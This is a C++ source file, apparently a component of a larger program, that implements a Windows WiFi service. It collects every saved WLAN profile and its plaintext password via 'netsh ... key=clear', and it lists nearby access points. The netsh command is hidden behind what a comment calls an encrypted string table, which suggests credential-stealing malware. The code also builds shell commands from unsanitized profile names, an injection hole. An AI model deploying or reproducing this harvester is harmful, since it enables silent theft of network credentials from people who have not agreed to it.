#include "infrastructure/system/WindowsWifiService.hpp"

#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <string>
#include <vector>

#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::system {

std::string WindowsWifiService::get_saved_networks() {
    std::string result;

    // Use encrypted string for netsh command
    std::string netsh_profiles = domain::StringTable::get("netsh_profiles");
    FILE* pipe = _popen(netsh_profiles.c_str(), "r");
    if (!pipe) return "Error: could not execute netsh";

    std::array<char, 4096> buffer{};
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
        result += buffer.data();
    }
    _pclose(pipe);

    // Extract profile names and get their keys
    std::istringstream iss(result);
    std::string line;
    std::string output = "Saved WiFi Networks:\n\n";

    while (std::getline(iss, line)) {
        // Find lines with "All User Profile" or "Perfil de todos los usuarios"
        if (line.find("All User Profile") != std::string::npos ||
            line.find("Perfil de todos los usuarios") != std::string::npos) {
            // Extract profile name (after the colon)
            auto pos = line.find(':');
            if (pos != std::string::npos) {
                std::string profile = line.substr(pos + 1);
                // Trim whitespace
                while (!profile.empty() && profile[0] == ' ') profile.erase(0, 1);
                while (!profile.empty() && profile.back() == ' ') profile.pop_back();

                if (!profile.empty()) {
                    output += "Network: " + profile + "\n";

                    // Get the password for this profile
                    std::string cmd = "netsh wlan show profile name=\"" + profile + "\" key=clear 2>&1";
                    FILE* key_pipe = _popen(cmd.c_str(), "r");
                    if (key_pipe) {
                        std::array<char, 4096> key_buf{};
                        while (fgets(key_buf.data(), static_cast<int>(key_buf.size()), key_pipe) != nullptr) {
                            std::string key_line(key_buf.data());
                            if (key_line.find("Key Content") != std::string::npos ||
                                key_line.find("Contenido de la clave") != std::string::npos) {
                                auto kpos = key_line.find(':');
                                if (kpos != std::string::npos) {
                                    std::string key = key_line.substr(kpos + 1);
                                    while (!key.empty() && key[0] == ' ') key.erase(0, 1);
                                    while (!key.empty() && key.back() == ' ') key.pop_back();
                                    // Remove trailing newline
                                    while (!key.empty() && (key.back() == '\n' || key.back() == '\r')) key.pop_back();
                                    output += "Password: " + key + "\n";
                                }
                            }
                        }
                        _pclose(key_pipe);
                    }
                    output += "\n";
                }
            }
        }
    }

    return output;
}

std::vector<application::interfaces::WifiAccessPoint> WindowsWifiService::get_visible_networks() {
    std::vector<application::interfaces::WifiAccessPoint> aps;

    std::string cmd = domain::StringTable::get("netsh_visible");
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return aps;

    std::array<char, 4096> buffer{};
    std::string raw;
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
        raw += buffer.data();
    }
    _pclose(pipe);

    std::istringstream iss(raw);
    std::string line;
    std::string current_ssid;

    while (std::getline(iss, line)) {
        // SSID line: "SSID 1 : MyNetwork"
        if (line.find("SSID") != std::string::npos && line.find(':') != std::string::npos) {
            auto pos = line.find(':');
            current_ssid = line.substr(pos + 1);
            while (!current_ssid.empty() && current_ssid[0] == ' ') current_ssid.erase(0, 1);
            while (!current_ssid.empty() && (current_ssid.back() == ' ' || current_ssid.back() == '\r')) current_ssid.pop_back();
            // Skip hidden SSIDs
            if (current_ssid.empty()) continue;
        }

        // BSSID line: "BSSID 1 : aa:bb:cc:dd:ee:ff"
        if (line.find("BSSID") != std::string::npos && line.find(':') != std::string::npos) {
            // Check it's the BSSID line specifically (has MAC-like pattern)
            auto pos = line.find(':');
            std::string after_colon = line.substr(pos + 1);
            while (!after_colon.empty() && after_colon[0] == ' ') after_colon.erase(0, 1);

            // Check if it looks like a MAC address (xx:xx:xx:xx:xx:xx)
            if (after_colon.size() >= 17 && after_colon[2] == ':' && after_colon[5] == ':') {
                std::string mac = after_colon.substr(0, 17);

                application::interfaces::WifiAccessPoint ap;
                ap.ssid = current_ssid;
                ap.bssid = mac;

                // Read next lines to find Signal
                std::string next_line;
                while (std::getline(iss, next_line)) {
                    if (next_line.find("Signal") != std::string::npos && next_line.find('%') != std::string::npos) {
                        auto sp = next_line.find(':');
                        if (sp != std::string::npos) {
                            std::string sig_str = next_line.substr(sp + 1);
                            while (!sig_str.empty() && sig_str[0] == ' ') sig_str.erase(0, 1);
                            auto pct = sig_str.find('%');
                            if (pct != std::string::npos) {
                                sig_str = sig_str.substr(0, pct);
                                try { ap.signal_percent = std::stoi(sig_str); }
                                catch (...) {}
                            }
                        }
                        break;
                    }
                    // Stop if we hit next SSID or BSSID
                    if (next_line.find("SSID") != std::string::npos && next_line.find(':') != std::string::npos) {
                        iss.seekg(-static_cast<int>(next_line.size()) - 1, std::ios_base::cur);
                        break;
                    }
                    if (next_line.find("BSSID") != std::string::npos && next_line.find(':') != std::string::npos) {
                        iss.seekg(-static_cast<int>(next_line.size()) - 1, std::ios_base::cur);
                        break;
                    }
                }

                aps.push_back(std::move(ap));
            }
        }
    }

    return aps;
}

} // namespace nuub::infrastructure::system
